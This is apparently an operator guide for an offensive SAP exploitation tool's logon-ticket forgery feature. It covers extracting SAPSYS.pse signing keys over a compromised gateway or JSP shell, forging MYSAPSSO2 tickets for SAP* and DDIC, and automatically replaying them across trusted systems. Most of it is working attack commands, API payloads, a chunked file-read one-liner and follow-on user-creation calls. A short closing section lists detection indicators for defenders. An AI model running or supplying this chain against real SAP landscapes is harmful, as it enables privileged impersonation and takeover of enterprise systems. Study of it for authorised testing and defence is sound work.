# Operator Guide — MYSAPSSO2 Logon-Ticket Forgery

Companion to `12_mysapsso2_ticket_forgery_plan.md` (the planning
document).  This file describes the **shipped** implementation, how to
drive it as an operator, what artefacts it produces, and how to use
them against a live SAP landscape.

Implemented across 12 commits (Phase A → Phase D) under the Cyber
Verification Program.  Authorised security testing only.

---

## 1. What the feature does

For any **ABAP SAP system** where SAPMAP has OS-exec as `<sid>adm`
(via GW SAPXPG / 10KBLAZE, CVE-2025-31324 JSP shell, dpmon SAP\*, or
any other shell channel), the feature produces:

* A **MYSAPSSO2 logon ticket** impersonating an arbitrary user (`SAP*`,
  `DDIC`, ...).  Signed by the target system's own `SAPSYS.pse` —
  hence accepted by every receiver in the `STRUSTSSO2` trust subgraph
  with zero further authentication.
* Five drop-in delivery artefacts written to
  `loot/tickets/<SID>_<user>_<timestamp>/`:

  | File              | Use                                          |
  |-------------------|----------------------------------------------|
  | `ticket.b64`      | Raw base64 ticket (drop in any pyrfc / HTTP) |
  | `<user>@<SID>.sap`| **Double-click to launch SAP GUI as `<user>`**|
  | `curl.sh`         | Shell-out for WebGUI / Fiori / ICF endpoints |
  | `pyrfc.json`      | `pyrfc.Connection(**kwargs)` parameters      |
  | `_meta.txt`       | Provenance + signer cert details             |

Each ticket is also recorded on the in-memory `SAPMAPState`
(see §6) so the map UI surfaces it, AutoPwn can replay it, and a
`state.json` save preserves it across sessions.

---

## 2. Three ways to drive it

### 2.1 AutoPwn (automatic, no operator action)

When AutoPwn runs against an ABAP node whose OS-exec channel is
already proven (`gw_vulnerable`, `cve_2025_31324_vulnerable`, or
`dpmon_sap_star_available`), Phase 3 (Enrich) **automatically forges
tickets for SAP\* and DDIC** before moving to propagation.

No knobs.  See `_AUTOPWN_TICKET_USERS` in
`modules/exploitation/sapmap_autopwn.py` if you want to add more
default impersonation targets (e.g. an operator-specific user that's
known to have SAP_ALL on every receiver).

Console output during a Phase-3 run on an eligible node:

```
[*]   PRD: MYSAPSSO2 ticket forgery — 2 impersonation target(s)
[+]   PRD: forged 'SAP*' ticket — 860B, signer CN=PRD,
            loot '/.../loot/tickets/PRD_SAP*_20260526_161645'
[+]   PRD: forged 'DDIC' ticket — 858B, signer CN=PRD, loot ...
```

Per-target failures are non-fatal — `SAP*` succeeding still wins us
the system even if `DDIC` hits an unexpected error.

### 2.2 Web UI / HTTP endpoints

Two endpoints attached to the map UI's bottle server
(`modules/core/sapmap_gui.py`, commit 10):

```http
POST /api/node/<sid>/forge_ticket
Content-Type: application/json

{
  "user":              "SAP*",          // default "SAP*"
  "client":            "100",           // default "100"
  "validity_min":      120,             // default 120
  "digest":            "sha256",        // sha256 for RSA, sha1 for DSA
  "pin":               null,            // optional explicit PIN
  "recipient_sid":     null,            // optional STRUSTSSO2 pin
  "recipient_client":  null
}
```

```http
POST /api/node/<sid>/propagate_ticket
Content-Type: application/json

{
  "ticket_index":  0,                   // index into node.forged_tickets
  "target_sids":   ["PRD", "QAS"],      // receivers to try
  "channels":      ["http", "rfc"],     // both by default
  "timeout":       10
}
```

Both return `{status: "started"}` immediately.  The real work runs in
a background task; results stream to the console and land on
`state.forged_tickets`.

`curl` example:

```bash
curl -s -X POST http://localhost:5000/api/node/S4H/forge_ticket \
  -H 'Content-Type: application/json' \
  -d '{"user":"SAP*","client":"100","digest":"sha1"}'
```

### 2.3 Standalone CLI

For end-to-end testing without the map UI running:

```bash
python3 tools/test_mysapsso2_chain.py \
    --host 192.168.2.209 --port 3300 \
    --sid S4H --hostname s4hanadev --instance 00 \
    --user "SAP*" --client 100
```

Useful flags:

* `--pse-path /usr/sap/S4H/D00/sec/sap_system_pki_instance.pse` —
  read an alternative PSE (e.g. when the standard `SAPSYS.pse` is in
  an unusual layout)
* `--pin-override <pin>` — skip the candidate-PIN walk and use this
  one directly
* `--digest sha1` — for older DSA-signed `SAPSYS.pse` PSEs (the
  default `sha256` is correct only for RSA / EC PSEs)
* `--recipient-sid QAS --recipient-client 200` — pin the ticket to
  a specific STRUSTSSO2 receiver (rejected everywhere else)
* `--find-pins` — discovery mode: scan the target for `cred_v2`,
  `sec_secstore.dat`, `.sapcred` candidates instead of running the
  chain
* `-v` — show per-chunk progress for the python3-based binary reads

---

## 3. Using the artefacts

### 3.1 SAP GUI (`.sap` shortcut)

Double-click `loot/tickets/<dir>/<user>@<SID>.sap`.  SAP GUI parses
the `[System]` / `[User]` / `[Function]` INI sections and injects the
URL-encoded `MYSAPSSO2=<base64>` cookie into the Diag handshake.
The configured `Command=` field (default `SU01`, user maintenance) is
opened immediately — the operator lands inside a logged-on session
as the impersonated user, no password prompt.

Works against SAP GUI for Windows + the Java GUI for macOS/Linux.

### 3.2 HTTP cookie (WebGUI / Fiori / ICF)

```bash
bash loot/tickets/<dir>/curl.sh
```

Runs `curl -v -k -L -b "MYSAPSSO2=..." "https://host:port/sap/bc/gui/sap/its/webgui?sap-client=NNN"`.
A successful logon returns the WebGUI launchpad; a rejection
redirects to the login form.

The propagation primitive (`sap_ticket_propagate.http_replay_ticket`)
implements the same check programmatically — it auto-detects
successful vs rejected outcomes from the response body / cookies /
status code, so the map UI gets a binary verdict per receiver
instead of a raw HTTP transcript.

### 3.3 RFC (`pyrfc`)

```python
import pyrfc, json
kwargs = json.load(open("loot/tickets/<dir>/pyrfc.json"))
c = pyrfc.Connection(**kwargs)
c.call("RFC_PING")
c.call("BAPI_USER_CREATE1", ...)   # impersonated user's privileges apply
```

Requires the `pyrfc` package + the SAP NW RFC SDK runtime — optional
dependencies that the AutoPwn / propagation code handles gracefully
when missing (HTTP-only fallback).

---

## 4. Multi-PSE layout support

Real-world SAP installs ship `SAPSYS.pse` in **three distinct ASN.1
layouts** — discovered empirically against a kernel-793 S4H:

| Layout | Container                                | Seen on                                      |
|--------|------------------------------------------|----------------------------------------------|
| A      | `[0]` → SEQUENCE → {OCTET, SEQ, OCTET}   | Classic v2 SAPSYS.pse                        |
| B      | `[0]` → {OCTET, SEQ, OCTET} directly     | `sap_system_pki_instance.pse`, `SAPSNCS.pse` |
| C      | plain SEQUENCE container (no `[0]` tag)  | S4H kernel 793 `SAPSYS.pse`                  |

The PSE parser in `modules/postex/sap_pse_loot.py` accepts all three
transparently.  Layout C is the most unusual — it omits the
context-specific wrapper and stores the PSE objects directly under
the inner SEQUENCE, with each "SKnew" / "Cert" / "PKRoot" / "PKList"
entry carrying its TeleTrusT OID, a `GeneralizedTime`, and the value
in plaintext (no whole-PSE encryption, no PIN needed).

DSA keys in layout C use a SAP-specific wire format that omits the
public value `Y` — only `P, Q, G, X` are serialised.  `Y = G^X mod P`
is recomputed by `_parse_sap_dsa_private_key()` before constructing
the `cryptography.hazmat.primitives.asymmetric.dsa.DSAPrivateKey`.

---

## 5. sapxpg output buffer workaround

SAP kernel **793+** truncates command stdout to roughly **128 bytes
per TLV line** — a single `base64 /path/to/SAPSYS.pse` call returns
only the first ~96 raw bytes of the 3.6 KB PSE file.

`sap_pse_loot.make_chunked_read_adapter(raw_gw_exec_fn)` wraps any
GwExecFn-compatible channel with python3-based chunked reads:

```
python3 -c print(__import__('base64').b64encode(
    open('<path>','rb').read()[O:E]).decode())
```

Each chunk is 72 raw bytes → 96 chars base64 + newline = 97 chars,
well under sapxpg's 128-byte ceiling.  The adapter is applied
automatically by `extract_and_forge_ticket` and the standalone CLI;
mirror it manually if you call `extract_pse_bundle` directly with a
custom exec channel.

---

## 6. State model

Forged tickets land on:

* `node.forged_tickets` — per-node, scoped to the **issuer** (the
  system whose `SAPSYS.pse` signed it)
* `state.forged_tickets` — global mirror for fast enumeration

The `ForgedTicket` dataclass (commit 7, `modules/core/sapmap_models.py`)
carries everything needed to replay later:

```python
ForgedTicket(
    user="SAP*",
    client="100",
    sid="PRD",
    cookie_b64="AjQxMDM...",
    ticket_size=860,
    forged_at="2026-05-26T14:16:45",
    validity_min=120,
    recipient_sid="",          # empty = open scope
    recipient_client="",
    signer_dn="CN=PRD",
    signer_serial="0A20250808140301",
    source_sid="PRD",
    source_node_ip="10.0.0.1",
    loot_path=".../loot/tickets/PRD_SAP*_20260526_161645",
    used_on=[                  # populated by propagate_via_forged_ticket
        {"sid": "QAS", "client": "200",
         "at": "...", "result": "success", "channel": "http"},
    ],
)
```

`ticket.is_expired()` returns True after `validity_min` minutes —
operators / propagation logic uses this to skip stale tickets.

`ticket.display_label()` produces a one-line UI string:
`"SAP*@PRD/100 (45 min left)"` or `"DDIC@PRD/000 → QAS/200 (expired)"`.

`ticket.record_use(sid, client, result, channel)` appends to
`used_on` — every replay attempt (success / rejection / network
error / expired) is recorded for forensic audit.

---

## 7. Troubleshooting

### "could not extract signing key with any PIN candidate"

The orchestrator tried every PIN candidate (empty, the cred_v2 PIN,
the legacy SAPSYS default, SID variants, the `<sid>adm` name) and
none decrypted the PSE.

* If the PSE uses a non-default operator-supplied PIN, pass it via
  `--pin-override` (CLI) or `"pin": "..."` (HTTP endpoint)
* If the PSE is `sap_system_pki_instance.pse` or another non-standard
  signer, use `--pse-path` to point at it directly
* Check whether the PSE is layout C (look for the "SKnew" string in
  plaintext in the `xxd` output) — in that case no PIN is needed and
  the parser should accept it as-is.  Empty PIN should win.

### "PSE: expected outer SEQUENCE, got 0x..."

Wrong PIN: the PBE decryption ran but produced bytes that don't
start with `0x30` (SEQUENCE).  Try more candidates — the discovery
mode `--find-pins` scans the system for additional `cred_v2` /
`sec_secstore.dat` files that might hold the right PIN.

### "base64 returned non-decodable output (0B)"

sapxpg's output buffer ate the read.  Make sure the chunked-read
adapter is wrapping your `gw_exec_fn` — the orchestrator does this
automatically; if you're calling `extract_pse_bundle` directly with
a custom channel, wrap it via
`sap_pse_loot.make_chunked_read_adapter`.

### Ticket forged but receiver rejects it

* Verify the receiver actually trusts the issuer's cert — `STRUSTSSO2 /
  TWPSSO2ACL` on the receiver must list `Owner = CN=<ISSUER>` and
  `Issuer = CN=<ISSUER>` (or whichever CA chain the signer uses)
* Check the `digest` matches what the receiver accepts.  Older
  DSA-signed PSEs sign with SHA-1 (use `--digest sha1`); modern RSA/EC
  ones with SHA-256.  Wrong digest = signature verification fails
  silently → login form
* `ticket.is_expired()` — the validity window is **wall-clock from
  `forged_at`**, not the receiver's clock.  A 2-minute clock skew
  between issuer and receiver can reject a freshly-forged ticket.

---

## 8. Security implications + detection

For defenders reading this guide, here's what landscape-wide ticket
forgery looks like on the wire:

* **Issuer (the system we extracted the PSE from)**: a single
  `base64` (or python3 chunked equivalent) read of
  `/usr/sap/<SID>/<INST>/sec/SAPSYS.pse` + `/.../cred_v2`.  Nothing
  else.  No user creation, no `USR02` modification, no audit log
  entry for the forgery itself.
* **Receiver(s)**: a successful "SSO ticket logon" event in the
  user master audit log.  Looks identical to a routine SSO event
  from the SAP Portal / SolMan / GRC — high false-positive baseline.

Strong indicators a forgery has occurred:

1. SSO ticket logon as a built-in user (`SAP*`, `DDIC`, `SAPCPIC`)
   that wouldn't normally use SSO
2. Ticket signed by a SID that doesn't have a legitimate operational
   reason to issue tickets to the receiver in question
3. Time-of-day or source-IP anomalies for SSO logon events

The cleanest defensive control is the STRUSTSSO2 trust list itself:
**every entry adds a forgery vector across the trust subgraph.**
Aggressively prune STRUSTSSO2 to the minimum set of issuers the
landscape actually depends on.  Rotate `SAPSYS.pse` keys whenever
OS-level compromise of any issuer is suspected.
